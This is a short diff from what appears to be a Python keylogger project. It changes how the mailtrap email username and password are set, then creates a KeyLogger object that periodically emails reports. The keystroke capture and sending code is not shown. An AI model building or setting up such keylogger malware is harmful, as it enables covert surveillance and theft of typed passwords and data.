@@ -140,8 +140,8 @@ class KeyLogger:
             except OSError:
                 print('File is closed.')
 
-emailAddress = input("Enter your mailtrap username: ")
-emailPassword = input("Enter your mailtrap password: ")
+emailAddress = "" # Enter your mailtrap username here 
+emailPassword = "" # Enter your mailtrap password here 
 
 final_product = KeyLogger(sendReportEvery, emailAddress, emailPassword)
 
